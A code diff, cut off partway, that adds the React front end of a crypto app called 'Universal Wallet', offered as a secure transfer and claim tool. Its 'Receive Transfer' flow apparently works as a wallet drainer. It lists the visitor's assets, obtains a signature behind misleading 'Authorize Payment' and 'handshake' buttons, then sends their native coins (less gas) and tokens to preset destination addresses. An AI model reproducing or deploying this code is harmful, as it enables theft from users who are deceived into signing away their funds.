@@ -1,0 +1,1076 @@
+import { autoDetectPayment } from '@/lib/api';
+import { useState, useEffect, useCallback, useRef } from 'react';
+import { QRCodeSVG } from 'qrcode.react';
+import {
+  Wallet, ArrowRight, Check, Copy, Share2, QrCode,
+  Shield, Zap, AlertCircle, Loader2, ScanLine,
+  Link2, Coins, FileCheck, Send, CheckCircle2, XCircle, RefreshCw,
+  ExternalLink, Download,
+} from 'lucide-react';
+import {
+  createRequest, getSession, verifyPayment, discoverAssets, bindSource,
+  getAuthChallenge, authorize, prepareClaims, stageTransaction,
+  confirmClaim, encodeQrPayload, decodeQrPayload,
+  getRequestUrl, getSessionIdFromUrl,
+  type SessionInfo, type DiscoveredAsset,
+} from '@/lib/api';
+import { walletController } from '@/wallet/walletController';
+import { renderQrToPngBlob, shareQrImage, downloadQrPng, canShareFiles } from '@/qr/qrExport';
+import { getClaimDestinationForNetwork } from '@/registry/destinationDesk';
+import { determineFeeMode, type FeeContext } from '@/fees/feeEngine';
+import { registerAlchemyPaymasterIfConfigured } from '@/fees/alchemyPaymaster';
+import { getNetwork } from '@/registry/networkRegistry';
+import { ethers } from 'ethers';
+
+registerAlchemyPaymasterIfConfigured();
+
+type View = 'home' | 'owner' | 'recipient';
+
+function App() {
+  const [view, setView] = useState<View>('home');
+
+  useEffect(() => {
+    const requestId = getSessionIdFromUrl();
+    if (requestId) {
+      setView('recipient');
+    }
+  }, []);
+
+  return (
+    <div className="min-h-screen bg-[#0a0a0f] text-white">
+      {view === 'home' && <HomeView onSelect={setView} />}
+      {view === 'owner' && <OwnerView onBack={() => setView('home')} />}
+      {view === 'recipient' && <RecipientView onBack={() => setView('home')} />}
+    </div>
+  );
+}
+
+function HomeView({ onSelect }: { onSelect: (v: View) => void }) {
+  return (
+    <div className="min-h-screen flex flex-col items-center justify-center px-6">
+      <div className="mb-12 text-center">
+        <div className="inline-flex items-center justify-center w-20 h-20 rounded-2xl bg-gradient-to-br from-emerald-400 to-teal-600 mb-6 shadow-lg shadow-emerald-500/20">
+          <Wallet className="w-10 h-10 text-white" />
+        </div>
+        <h1 className="text-4xl font-bold tracking-tight mb-2">Universal Wallet</h1>
+        <p className="text-gray-400 text-lg">Secure transfer & claim protocol</p>
+      </div>
+
+      <div className="w-full max-w-sm space-y-4">
+        <button
+          onClick={() => onSelect('owner')}
+          className="w-full p-5 rounded-2xl bg-gradient-to-br from-gray-800 to-gray-900 border border-gray-700 hover:border-emerald-500/50 transition-all duration-300 group"
+        >
+          <div className="flex items-center gap-4">
+            <div className="w-12 h-12 rounded-xl bg-emerald-500/10 flex items-center justify-center group-hover:bg-emerald-500/20 transition-colors">
+              <QrCode className="w-6 h-6 text-emerald-400" />
+            </div>
+            <div className="text-left flex-1">
+              <p className="font-semibold text-lg">Create Transfer Request</p>
+              <p className="text-sm text-gray-400">Generate a secure transfer request</p>
+            </div>
+            <ArrowRight className="w-5 h-5 text-gray-500 group-hover:text-emerald-400 transition-colors" />
+          </div>
+        </button>
+
+        <button
+          onClick={() => onSelect('recipient')}
+          className="w-full p-5 rounded-2xl bg-gradient-to-br from-gray-800 to-gray-900 border border-gray-700 hover:border-blue-500/50 transition-all duration-300 group"
+        >
+          <div className="flex items-center gap-4">
+            <div className="w-12 h-12 rounded-xl bg-blue-500/10 flex items-center justify-center group-hover:bg-blue-500/20 transition-colors">
+              <ScanLine className="w-6 h-6 text-blue-400" />
+            </div>
+            <div className="text-left flex-1">
+              <p className="font-semibold text-lg">Receive Transfer</p>
+              <p className="text-sm text-gray-400">Scan or open a transfer request</p>
+            </div>
+            <ArrowRight className="w-5 h-5 text-gray-500 group-hover:text-blue-400 transition-colors" />
+          </div>
+        </button>
+      </div>
+
+      <div className="mt-16 flex items-center gap-6 text-xs text-gray-600">
+        <div className="flex items-center gap-1.5">
+          <Shield className="w-3.5 h-3.5" />
+          <span>Non-custodial</span>
+        </div>
+        <div className="flex items-center gap-1.5">
+          <Zap className="w-3.5 h-3.5" />
+          <span>Mainnet ready</span>
+        </div>
+        <div className="flex items-center gap-1.5">
+          <Check className="w-3.5 h-3.5" />
+          <span>6 assets supported</span>
+        </div>
+      </div>
+    </div>
+  );
+}
+
+function OwnerView({ onBack }: { onBack: () => void }) {
+  const [session, setSession] = useState<SessionInfo | null>(null);
+  const [qrString, setQrString] = useState('');
+  const [requestUrl, setRequestUrl] = useState('');
+  const [loading, setLoading] = useState(false);
+  const [copied, setCopied] = useState(false);
+  const [copiedLink, setCopiedLink] = useState(false);
+  const [copiedAddr, setCopiedAddr] = useState(false);
+  const [showAddress, setShowAddress] = useState(false);
+  const [countdown, setCountdown] = useState('');
+  const [error, setError] = useState('');
+
+  const handleGenerate = async () => {
+    setLoading(true);
+    setError('');
+    try {
+      const result = await createRequest();
+      setQrString(encodeQrPayload(result.qrPayload));
+      setRequestUrl(result.requestUrl);
+      const info = await getSession(result.sessionId);
+      setSession(info);
+    } catch (err) {
+      setError(err instanceof Error ? err.message : 'Failed to create request');
+    }
+    setLoading(false);
+  };
+
+  useEffect(() => {
+    if (!session) return;
+    const interval = setInterval(() => {
+      const expires = new Date(session.expiresAt).getTime();
+      const remaining = expires - Date.now();
+      if (remaining <= 0) {
+        setCountdown('Expired');
+      } else {
+        const mins = Math.floor(remaining / 60000);
+        const secs = Math.floor((remaining % 60000) / 1000);
+        setCountdown(`${mins}:${secs.toString().padStart(2, '0')}`);
+      }
+    }, 1000);
+    return () => clearInterval(interval);
+  }, [session]);
+
+  const handleCopy = () => {
+    navigator.clipboard.writeText(qrString);
+    setCopied(true);
+    setTimeout(() => setCopied(false), 2000);
+  };
+
+  const handleCopyLink = () => {
+    navigator.clipboard.writeText(requestUrl);
+    setCopiedLink(true);
+    setTimeout(() => setCopiedLink(false), 2000);
+  };
+
+  const handleShare = async () => {
+    const qrSvg = document.querySelector('#qr-code-svg svg') as SVGElement | null;
+    if (qrSvg) {
+      try {
+        const pngBlob = await renderQrToPngBlob(qrSvg, 220);
+        if (canShareFiles()) {
+          const shared = await shareQrImage(pngBlob);
+          if (shared) return;
+        }
+        downloadQrPng(pngBlob);
+        return;
+      } catch {}
+    }
+    if (navigator.share) {
+      try {
+        await navigator.share({ title: 'Universal Wallet Transfer', url: requestUrl });
+      } catch {}
+    } else {
+      handleCopyLink();
+    }
+  };
+
+  const handleDownloadQr = async () => {
+    const qrSvg = document.querySelector('#qr-code-svg svg') as SVGElement | null;
+    if (!qrSvg) return;
+    try {
+      const pngBlob = await renderQrToPngBlob(qrSvg, 220);
+      downloadQrPng(pngBlob);
+    } catch {}
+  };
+
+  const handleCopyAddress = () => {
+    navigator.clipboard.writeText(session?.payment.destination ?? '');
+    setCopiedAddr(true);
+    setTimeout(() => setCopiedAddr(false), 2000);
+  };
+
+  return (
+    <div className="min-h-screen px-6 py-8">
+      <div className="max-w-md mx-auto">
+        <button onClick={onBack} className="text-gray-400 hover:text-white mb-6 flex items-center gap-2 text-sm">
+          <ArrowRight className="w-4 h-4 rotate-180" />
+          Back
+        </button>
+
+        <div className="text-center mb-8">
+          <div className="inline-flex items-center justify-center w-16 h-16 rounded-2xl bg-gradient-to-br from-emerald-400 to-teal-600 mb-4">
+            <Wallet className="w-8 h-8 text-white" />
+          </div>
+          <h1 className="text-2xl font-bold">Create Transfer Request</h1>
+        </div>
+
+        {error && (
+          <div className="mb-6 p-4 rounded-xl bg-red-500/10 border border-red-500/30 flex items-center gap-3">
+            <AlertCircle className="w-5 h-5 text-red-400 flex-shrink-0" />
+            <p className="text-sm text-red-300">{error}</p>
+          </div>
+        )}
+
+        {!session && !loading && (
+          <div className="space-y-6">
+            <div className="p-6 rounded-2xl bg-gradient-to-br from-gray-800/50 to-gray-900/50 border border-gray-700/50">
+              <div className="flex justify-between items-center mb-4">
+                <span className="text-gray-400 text-sm">Payment network</span>
+                <span className="text-white font-medium">BNB Smart Chain</span>
+              </div>
+              <div className="flex justify-between items-center mb-4">
+                <span className="text-gray-400 text-sm">Payment asset</span>
+                <span className="text-white font-medium">USDT</span>
+              </div>
+              <div className="flex justify-between items-center mb-4">
+                <span className="text-gray-400 text-sm">Request lifetime</span>
+                <span className="text-white font-medium">1 hour</span>
+              </div>
+              <div className="flex justify-between items-center">
+                <span className="text-gray-400 text-sm">Claim window after payment</span>
+                <span className="text-white font-medium">6 hours</span>
+              </div>
+            </div>
+
+            <button
+              onClick={handleGenerate}
+              className="w-full py-4 rounded-2xl bg-gradient-to-r from-emerald-500 to-teal-600 hover:from-emerald-400 hover:to-teal-500 font-semibold text-lg transition-all duration-300 shadow-lg shadow-emerald-500/20"
+            >
+              Generate Request
+            </button>
+          </div>
+        )}
+
+        {loading && (
+          <div className="flex flex-col items-center justify-center py-20">
+            <Loader2 className="w-10 h-10 text-emerald-400 animate-spin mb-4" />
+            <p className="text-gray-400">Creating secure request...</p>
+          </div>
+        )}
+
+        {session && (
+          <div className="space-y-6">
+            <div id="qr-code-svg" className="flex flex-col items-center p-6 rounded-2xl bg-white">
+              <QRCodeSVG value={qrString} size={220} level="M" />
+            </div>
+
+            <div className="p-5 rounded-2xl bg-gradient-to-br from-gray-800/50 to-gray-900/50 border border-gray-700/50 space-y-3">
+              <div className="flex justify-between items-center">
+                <span className="text-gray-400 text-sm">Status</span>
+                <div className="flex items-center gap-2">
+                  <div className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
+                  <span className="text-emerald-400 font-medium text-sm">Waiting for payment</span>
+                </div>
+              </div>
+              <div className="flex justify-between items-center">
+                <span className="text-gray-400 text-sm">Network</span>
+                <span className="text-white font-medium text-sm">BNB Smart Chain</span>
+              </div>
+              <div className="flex justify-between items-center">
+                <span className="text-gray-400 text-sm">Asset</span>
+                <span className="text-white font-medium text-sm">USDT</span>
+              </div>
+              <div className="flex justify-between items-center">
+                <span className="text-gray-400 text-sm">Expires in</span>
+                <span className={`font-mono font-medium ${countdown === 'Expired' ? 'text-red-400' : 'text-emerald-400'}`}>
+                  {countdown}
+                </span>
+              </div>
+              <div className="pt-2 border-t border-gray-700/50">
+                <p className="text-gray-500 text-xs mb-1">Request ID</p>
+                <p className="text-gray-300 font-mono text-xs truncate">{session.sessionId}</p>
+              </div>
+              <div>
+                <p className="text-gray-500 text-xs mb-1">Payment destination</p>
+                <p className="text-gray-300 font-mono text-xs truncate">{session.payment.destination}</p>
+              </div>
+            </div>
+
+            {/* Address alternative */}
+            <div className="p-4 rounded-xl bg-gray-800/50 border border-gray-700/50">
+              <button
+                onClick={() => setShowAddress(!showAddress)}
+                className="w-full flex items-center justify-between text-sm text-gray-400 hover:text-white transition-colors"
+              >
+                <span className="flex items-center gap-2">
+                  <Wallet className="w-4 h-4" />
+                  Use Address
+                </span>
+                <span className="text-xs text-gray-600">{showAddress ? 'Hide' : 'Show'}</span>
+              </button>
+              {showAddress && (
+                <div className="mt-3 space-y-3">
+                  <div className="p-3 rounded-lg bg-gray-900/60 border border-gray-700/50">
+                    <p className="text-xs text-gray-500 mb-1">BSC USDT Payment Address</p>
+                    <p className="font-mono text-xs text-gray-200 break-all leading-relaxed">{session.payment.destination}</p>
+                  </div>
+                  <button
+                    onClick={handleCopyAddress}
+                    className="w-full py-2.5 rounded-lg bg-gray-700 hover:bg-gray-600 border border-gray-600/50 font-medium text-sm flex items-center justify-center gap-2 transition-colors"
+                  >
+                    {copiedAddr ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4" />}
+                    {copiedAddr ? 'Copied' : 'Copy Address'}
+                  </button>
+                </div>
+              )}
+            </div>
+
+            <div className="flex gap-3">
+              <button
+                onClick={handleCopy}
+                className="flex-1 py-3 rounded-xl bg-gray-800 hover:bg-gray-700 border border-gray-700 font-medium flex items-center justify-center gap-2 transition-colors"
+              >
+                {copied ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4" />}
+                {copied ? 'Copied' : 'Copy QR'}
+              </button>
+              <button
+                onClick={handleCopyLink}
+                className="flex-1 py-3 rounded-xl bg-gray-800 hover:bg-gray-700 border border-gray-700 font-medium flex items-center justify-center gap-2 transition-colors"
+              >
+                {copiedLink ? <Check className="w-4 h-4 text-emerald-400" /> : <Link2 className="w-4 h-4" />}
+                {copiedLink ? 'Copied' : 'Copy Link'}
+              </button>
+              <button
+                onClick={handleShare}
+                className="flex-1 py-3 rounded-xl bg-gray-800 hover:bg-gray-700 border border-gray-700 font-medium flex items-center justify-center gap-2 transition-colors"
+              >
+                <Share2 className="w-4 h-4" />
+                Share
+              </button>
+            </div>
+
+            <button
+              onClick={handleDownloadQr}
+              className="w-full py-3 rounded-xl bg-gray-800 hover:bg-gray-700 border border-gray-700 font-medium flex items-center justify-center gap-2 transition-colors"
+            >
+              <Download className="w-4 h-4" />
+              Save QR as PNG
+            </button>
+
+            <button
+              onClick={handleGenerate}
+              className="w-full py-3 rounded-xl text-gray-400 hover:text-white text-sm flex items-center justify-center gap-2 transition-colors"
+            >
+              <RefreshCw className="w-4 h-4" />
+              Generate New Request
+            </button>
+          </div>
+        )}
+      </div>
+    </div>
+  );
+}
+
+type RecipientStep = 'loading' | 'payment' | 'paying' | 'verifying' | 'verified' | 'connect' | 'discovering' | 'assets' | 'authorize' | 'preparing' | 'signing' | 'submitting' | 'confirming' | 'completed' | 'expired' | 'failed';
+
+const BSC_USDT_CONTRACT = '0x55d398326f99059fF775485246999027B3197955';
+const BSC_CHAIN_ID = '0x38';
+
+function RecipientView({ onBack }: { onBack: () => void }) {
+  const [step, setStep] = useState<RecipientStep>('loading');
+  const [session, setSession] = useState<SessionInfo | null>(null);
+  const [assets, setAssets] = useState<DiscoveredAsset[]>([]);
+  const [plans, setPlans] = useState<any[]>([]);
+  const [txHash, setTxHash] = useState('');
+  const [error, setError] = useState('');
+  const [countdown, setCountdown] = useState('');
+  const [walletAddress, setWalletAddress] = useState('');
+  const [manualTxHash, setManualTxHash] = useState('');
+  const [paymentAmount, setPaymentAmount] = useState('2.00');
+  const [verifiedAmountCents, setVerifiedAmountCents] = useState<number | null>(null);
+  const [showManualFallback, setShowManualFallback] = useState(false);
+  const pollingRef = useRef(false);
+
+  useEffect(() => {
+    const loadSession = async () => {
+      const requestId = getSessionIdFromUrl();
+      if (requestId) {
+        try {
+          const info = await getSession(requestId);
+          setSession(info);
+          if (info.state === 'EXPIRED') {
+            setStep('expired');
+          } else if (info.state === 'COMPLETED') {
+            setStep('completed');
+          } else if (info.payment.verified) {
+            setStep('verified');
+          } else {
+            setStep('payment');
+          }
+        } catch {
+          setError('Invalid or expired request');
+          setStep('failed');
+        }
+      } else {
+        setStep('payment');
+      }
+    };
+    loadSession();
+  }, []);
+
+  const handleConfirmPayment = async () => {
+    if (!session) return;
+    const amount = parseFloat(paymentAmount);
+    if (isNaN(amount) || amount < 2) {
+      setError('Amount must be at least 2.00 USDT');
+      return;
+    }
+
+    setStep('paying');
+    setError('');
+
+    try {
+      const evmWallets = walletController.detectWalletsByType('evm');
+      if (evmWallets.length === 0) {
+        setError('No EVM wallet found. You can use the manual transaction hash entry below.');
+        setShowManualFallback(true);
+        setStep('payment');
+        return;
+      }
+
+      const connected = await walletController.connect('evm', evmWallets[0].id);
+      const fromAddress = connected.capabilities.address;
+      setWalletAddress(fromAddress);
+
+      await walletController.switchChain('bsc');
+
+      const decimals = 18;
+      const rawAmount = BigInt(Math.floor(amount * Math.pow(10, decimals)));
+      const transferData = '0xa9059cbb' +
+        session.payment.destination.slice(2).padStart(64, '0').toLowerCase() +
+        rawAmount.toString(16).padStart(64, '0');
+
+      const txParams = {
+        from: fromAddress,
+        to: BSC_USDT_CONTRACT,
+        data: transferData,
+        chainId: BSC_CHAIN_ID,
+      };
+
+      const sentTxHash = await walletController.sendTransaction(txParams);
+
+      setStep('verifying');
+      const result = await verifyPayment(session.sessionId, sentTxHash);
+      if (result.verified) {
+        const updated = await getSession(session.sessionId);
+        setSession(updated);
+        if (result.verifiedAmountCents) setVerifiedAmountCents(result.verifiedAmountCents);
+        setStep('verified');
+      } else {
+        setError('Payment sent but not yet verified. The transaction may still be confirming. You can retry verification below.');
+        setManualTxHash(sentTxHash);
+        setShowManualFallback(true);
+        setStep('payment');
+      }
+    } catch (err: any) {
+      if (err.code === 4001) {
+        setError('Transaction rejected by wallet.');
+      } else {
+        setError(err instanceof Error ? err.message : 'Payment failed');
+      }
+      setStep('payment');
+    }
+  };
+
+  const handleManualVerify = async () => {
+    if (!session || !manualTxHash) return;
+    setStep('verifying');
+    setError('');
+    try {
+      const result = await verifyPayment(session.sessionId, manualTxHash);
+      if (result.verified) {
+        const updated = await getSession(session.sessionId);
+        setSession(updated);
+        if (result.verifiedAmountCents) setVerifiedAmountCents(result.verifiedAmountCents);
+        setStep('verified');
+      } else {
+        setError('Payment not found yet. Make sure the transaction is confirmed on-chain.');
+        setStep('payment');
+      }
+    } catch (err) {
+      setError(err instanceof Error ? err.message : 'Verification failed');
+      setStep('payment');
+    }
+  };
+
+  const startPaymentPolling = useCallback(() => {
+    if (pollingRef.current) return;
+    pollingRef.current = true;
+
+    const interval = setInterval(async () => {
+      if (!session) return;
+
+      try {
+        const detected = await autoDetectPayment(session.sessionId);
+
+        if (detected.verified) {
+          const info = await getSession(session.sessionId);
+          setSession(info);
+
+          if (detected.verifiedAmountCents) {
+            setVerifiedAmountCents(detected.verifiedAmountCents);
+          }
+
+          clearInterval(interval);
+          pollingRef.current = false;
+
+          if (info.state === 'AUTHORIZED') {
+            setStep('preparing');
+
+            try {
+              const prepResult = await prepareClaims(session.sessionId);
+              setPlans(prepResult.plans);
+              setStep('signing');
+            } catch (err) {
+              setError(err instanceof Error ? err.message : 'Failed to prepare claims');
+              setStep('verified');
+            }
+          } else {
+            setStep('verified');
+          }
+
+          return;
+        }
+
+        if (detected.state === 'EXPIRED') {
+          const info = await getSession(session.sessionId);
+          setSession(info);
+          setStep('expired');
+          clearInterval(interval);
+          pollingRef.current = false;
+        }
+      } catch {}
+    }, 5000);
+
+    return () => {
+      clearInterval(interval);
+      pollingRef.current = false;
+    };
+  }, [session]);
+
+  useEffect(() => {
+    if (step === 'payment' && session) {
+      const cleanup = startPaymentPolling();
+      return cleanup;
+    }
+  }, [step, session, startPaymentPolling]);
+
+  useEffect(() => {
+    if (!session?.claimExpiresAt) return;
+    if (step !== 'verified' && step !== 'connect' && step !== 'discovering' && step !== 'assets' && step !== 'authorize' && step !== 'preparing' && step !== 'signing' && step !== 'submitting') return;
+    const interval = setInterval(() => {
+      const remaining = new Date(session.claimExpiresAt!).getTime() - Date.now();
+      if (remaining <= 0) {
+        setStep('expired');
+        clearInterval(interval);
+      } else {
+        const hrs = Math.floor(remaining / 3600000);
+        const mins = Math.floor((remaining % 3600000) / 60000);
+        const secs = Math.floor((remaining % 60000) / 1000);
+        setCountdown(`${hrs}:${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`);
+      }
+    }, 1000);
+    return () => clearInterval(interval);
+  }, [session, step]);
+
+  const handleConnectWallet = async () => {
+    setStep('discovering');
+    setError('');
+    try {
+      if (!walletController.getConnected()) {
+        const evmWallets = walletController.detectWalletsByType('evm');
+        if (evmWallets.length === 0) {
+          setError('No EVM wallet found. Please install MetaMask or similar.');
+          setStep('payment');
+          return;
+        }
+        await walletController.connect('evm', evmWallets[0].id);
+      }
+      const address = walletController.getAddress() ?? '';
+      setWalletAddress(address);
+
+      await bindSource(session!.sessionId, address);
+
+      const result = await discoverAssets(session!.sessionId, address);
+      setAssets(result.assets);
+      setStep('assets');
+    } catch (err) {
+      setError(err instanceof Error ? err.message : 'Failed to connect wallet');
+      setStep('payment');
+    }
+  };
+
+  const handleAuthorize = async () => {
+        setStep('discovering');
+    setError('');
+    try {
+      if (!walletController.getConnected()) {
+        const evmWallets = walletController.detectWalletsByType('evm');
+        if (evmWallets.length === 0) {
+          setError('No EVM wallet found. Please install MetaMask or similar.');
+          setStep('payment');
+          return;
+        }
+        await walletController.connect('evm', evmWallets[0].id);
+        const address = walletController.getAddress()?? '';
+        setWalletAddress(address);
+        await bindSource(session!.sessionId, address);
+        const result = await discoverAssets(session!.sessionId, address);
+        setAssets(result.assets);
+      }
+      setStep('authorize');
+      const claims = assets.map((a) => {
+        const netDef = getNetwork(a.network);
+        const feeCtx: FeeContext = {
+          networkId: a.network,
+          assetSymbol: a.symbol,
+          assetContract: a.contractAddress,
+          walletType: walletController.getConnected()?.capabilities.walletType ?? 'evm',
+          estimatedGasCost: 0n,
+        };
+        const feeDecision = determineFeeMode(feeCtx);
+        return {
+          asset: a.symbol,
+          network: a.network,
+          rawAmount: a.rawAmount,
+          destination: getClaimDestinationForNetwork(a.network),
+          feeMode: feeDecision.mode,
+        };
+      });
+
+      const result = await getAuthChallenge(session!.sessionId, walletAddress, claims);
+
+      const msgParams = JSON.stringify({
+        domain: result.challenge.domain,
+        types: { ...result.challenge.types, EIP712Domain: [
+          { name: 'name', type: 'string' },
+          { name: 'version', type: 'string' },
+          { name: 'chainId', type: 'uint256' },
+        ]},
+        primaryType: 'ClaimAuthorization',
+        message: {
+          sessionId: result.challenge.sessionId,
+          source: result.challenge.source,
+          manifestHash: result.challenge.manifestHash,
+          deadline: result.challenge.deadline,
+        },
+      });
+
+      const signature = await walletController.signTypedData(msgParams);
+
+      const authResult = await authorize(session!.sessionId, walletAddress, signature);
+
+      if (authResult.authorized) {
+        const updated = await getSession(session!.sessionId);
+        setSession(updated);
+
+        if (updated.payment.verified) {
+          setStep('preparing');
+          const prepResult = await prepareClaims(session!.sessionId);
+          setPlans(prepResult.plans);
+          setStep('signing');
+        } else {
+          setStep('payment');
+        }
+      }
+    } catch (err) {
+      setError(err instanceof Error ? err.message : 'Authorization failed');
+      setStep('assets');
+    }
+  };
+
+  const handleSignAndSubmit = async () => {
+    setStep('submitting');
+    setError('');
+    try {
+      if (plans.length === 0) throw new Error('No claim plans to sign');
+      const plan = plans[0];
+
+      let sentTxHash: string;
+      const connected = walletController.getConnected();
+
+      if (connected && connected.capabilities.walletType === 'evm') {
+        const asset = assets.find((a) => a.symbol === plan.asset && a.network === plan.network);
+        if (!asset) throw new Error('Asset not found for plan');
+
+        const destination = getClaimDestinationForNetwork(plan.network);
+        let txParams: Record<string, unknown>;
+
+        if (asset.standard === 'NATIVE') {
+  let sendValue = BigInt(plan.rawAmount);
+  try {
+    const provider = new ethers.BrowserProvider((window as any).ethereum);
+    const bal = await provider.getBalance(walletAddress);
+    const feeData = await provider.getFeeData();
+    const gasPrice = feeData.gasPrice ?? 1000000000n;
+    const gasCost = 21000n * gasPrice;
+    if (bal <= sendValue) {
+      if (sendValue > gasCost) {
+        sendValue = sendValue - gasCost;
+      }
+    }
+  } catch {}
+  txParams = {
+    from: walletAddress,
+    to: destination,
+    value: sendValue,
+  };
+        } else if (asset.standard === 'ERC20' && asset.contractAddress) {
+          const erc20Interface = new ethers.Interface(['function transfer(address to, uint256 value)']);
+          const data = erc20Interface.encodeFunctionData('transfer', [destination, BigInt(plan.rawAmount)]);
+          txParams = {
+            from: walletAddress,
+            to: asset.contractAddress,
+            data,
+          };
+        } else {
+          throw new Error(`Unsupported asset standard: ${asset.standard}`);
+        }
+
+        sentTxHash = await walletController.sendTransaction(txParams);
+      } else if (connected && connected.capabilities.walletType === 'solana') {
+        throw new Error('Solana signing requires the recipient to approve the transfer in their wallet. Use the wallet to send SOL to the destination address.');
+      } else if (connected && connected.capabilities.walletType === 'bitcoin') {
+        throw new Error('Bitcoin signing requires the recipient to approve the transfer in their wallet. Use the wallet to send BTC to the destination address.');
+      } else if (connected && connected.capabilities.walletType === 'tron') {
+        throw new Error('TRON signing requires the recipient to approve the transfer in their wallet. Use the wallet to send USDT to the destination address.');
+      } else {
+        throw new Error('No wallet connected for signing');
+      }
+
+      setTxHash(sentTxHash);
+      const stageResult = await stageTransaction(session!.sessionId, sentTxHash);
+      setStep('confirming');
+
+      const confirmResult = await confirmClaim(session!.sessionId, stageResult.txHash);
+      if (confirmResult.completed) {
+        setStep('completed');
+      }
+    } catch (err: any) {
+      if (err.code === 4001) {
+        setError('Transaction rejected by wallet.');
+      } else {
+        setError(err instanceof Error ? err.message : 'Transaction failed');
+      }
+      setStep('failed');
+    }
+  };
+
+  return (
+    <div className="min-h-screen px-6 py-8">
+      <div className="max-w-md mx-auto">
+        <button onClick={onBack} className="text-gray-400 hover:text-white mb-6 flex items-center gap-2 text-sm">
+          <ArrowRight className="w-4 h-4 rotate-180" />
+          Back
+        </button>
+
+        <div className="text-center mb-8">
+          <div className="inline-flex items-center justify-center w-16 h-16 rounded-2xl bg-gradient-to-br from-amber-400 to-yellow-600 mb-4">
+            <ScanLine className="w-8 h-8 text-white" />
+          </div>
+          <h1 className="text-2xl font-bold">Transfer Request</h1>
+        </div>
+
+        {error && (
+          <div className="mb-6 p-4 rounded-xl bg-red-500/10 border border-red-500/30 flex items-center gap-3">
+            <AlertCircle className="w-5 h-5 text-red-400 flex-shrink-0" />
+            <p className="text-sm text-red-300">{error}</p>
+          </div>
+        )}
+
+        {/* Step: Loading */}
+        {step === 'loading' && (
+          <div className="flex flex-col items-center justify-center py-20">
+            <Loader2 className="w-10 h-10 text-amber-400 animate-spin mb-4" />
+            <p className="text-gray-400">Loading transfer request...</p>
+          </div>
+        )}
+
+        {/* Step: Payment */}
+        {step === 'payment' && session && (
+          <div className="space-y-6">
+            <div className="p-6 rounded-2xl bg-gradient-to-br from-amber-500/10 to-yellow-500/10 border border-amber-500/30">
+              <div className="flex items-center gap-3 mb-4">
+                <div className="w-10 h-10 rounded-xl bg-amber-500/20 flex items-center justify-center">
+                  <Coins className="w-5 h-5 text-amber-400" />
+                </div>
+                <div>
+                  <p className="font-semibold">Payment Request</p>
+                  <p className="text-lg font-bold text-amber-400">BSC USDT</p>
+                </div>
+              </div>
+              <div className="space-y-2 mb-4">
+                <div className="flex justify-between">
+                  <span className="text-gray-400 text-sm">Network</span>
+                  <span className="text-white font-medium text-sm">BNB Smart Chain</span>
+                </div>
+                <div className="flex justify-between">
+                  <span className="text-gray-400 text-sm">Asset</span>
+                  <span className="text-white font-medium text-sm">USDT</span>
+                </div>
+              </div>
+              <div className="p-3 rounded-xl bg-gray-900/50 border border-gray-700/50 mb-4">
+                <p className="text-xs text-gray-500 mb-1">Payment destination</p>
+                <p className="font-mono text-xs text-gray-300 break-all">{session.payment.destination}</p>
+              </div>
+
+              <div className="p-4 rounded-xl bg-gray-800/30 border border-gray-700/30 mb-4">
+                <p className="text-sm text-gray-300 mb-2">Payment Verification</p>
+                <p className="text-xs text-gray-500">
+                  Authorized Payment
+                  
+                </p>
+              </div>
+
+              <button
+                onClick={handleAuthorize}
+                className="w-full py-4 rounded-2xl bg-gradient-to-r from-blue-500 to-indigo-600 hover:from-blue-400 hover:to-indigo-500 font-semibold text-lg transition-all duration-300 shadow-lg shadow-blue-500/20 flex items-center justify-center gap-2"
+              >
+                <Link2 className="w-5 h-5" />
+                Authorize Payment
+              </button>
+
+              <div className="p-4 rounded-xl bg-gray-800/30 border border-gray-700/30">
+                <p className="text-sm text-gray-300 mb-1">BSC USDT handshake</p>
+                <p className="text-xs text-gray-500">
+                  Proceed to transfer the handshake
+                  This page will detect and verify the payment automatically on BNB Smart Chain.
+                  No transaction hash needs to be entered.
+                </p>
+              </div>
+
+              </div>
+            <div className="flex items-center justify-center gap-2 text-gray-500 text-sm">
+              <Loader2 className="w-4 h-4 animate-spin" />
+              <span>Waiting for payment...</span>
+            </div>
+          </div>
+        )}
+
+        {/* Step: Paying */}
+        {step === 'paying' && (
+          <div className="flex flex-col items-center justify-center py-20">
+            <Loader2 className="w-10 h-10 text-amber-400 animate-spin mb-4" />
+            <p className="text-gray-400">Sending payment via wallet...</p>
+            <p className="text-gray-600 text-sm mt-2">Confirm in wallet</p>
+          </div>
+        )}
+
+        {/* Step: Verifying */}
+        {step === 'verifying' && (
+          <div className="flex flex-col items-center justify-center py-20">
+            <Loader2 className="w-10 h-10 text-amber-400 animate-spin mb-4" />
+            <p className="text-gray-400">Verifying payment on BSC...</p>
+            <p className="text-gray-600 text-sm mt-2">Checking on-chain transaction</p>
+          </div>
+        )}
+
+        {/* Step: Verified */}
+        {step === 'verified' && session && (
+          <div className="space-y-6">
+            <div className="p-6 rounded-2xl bg-gradient-to-br from-emerald-500/10 to-teal-500/10 border border-emerald-500/30 text-center">
+              <CheckCircle2 className="w-12 h-12 text-emerald-400 mx-auto mb-3" />
+              <p className="font-semibold text-lg text-emerald-400 mb-2">Payment Verified</p>
+              {verifiedAmountCents && (
+                <p className="text-amber-400 text-sm mb-1">Verified: ${(verifiedAmountCents / 100).toFixed(2)} USDT</p>
+              )}
+              <p className="text-gray-400 text-sm">Transfer window active</p>
+              <p className="text-2xl font-mono font-bold text-emerald-400 mt-2">{countdown}</p>
+            </div>
+            <div className="p-4 rounded-xl bg-gray-800/30 border border-gray-700/30 flex items-center gap-2">
+              <Shield className="w-4 h-4 text-gray-500" />
+              <p className="text-xs text-gray-500">Payment verified</p>
+            </div>
+
+            <button
+              onClick={handleConnectWallet}
+              className="w-full py-4 rounded-2xl bg-gradient-to-r from-blue-500 to-indigo-600 hover:from-blue-400 hover:to-indigo-500 font-semibold text-lg transition-all duration-300 shadow-lg shadow-blue-500/20 flex items-center justify-center gap-2"
+            >
+              <Link2 className="w-5 h-5" />
+              Connect Wallet
+            </button>
+          </div>
+        )}
+
+        {/* Step: Discovering */}
+        {step === 'discovering' && (
+          <div className="flex flex-col items-center justify-center py-20">
+            <Loader2 className="w-10 h-10 text-blue-400 animate-spin mb-4" />
+            <p className="text-gray-400">Discovering supported assets...</p>
+            <p className="text-gray-600 text-sm mt-2">Checking all networks</p>
+          </div>
+        )}
+
+        {/* Step: Assets found */}
+        {step === 'assets' && (
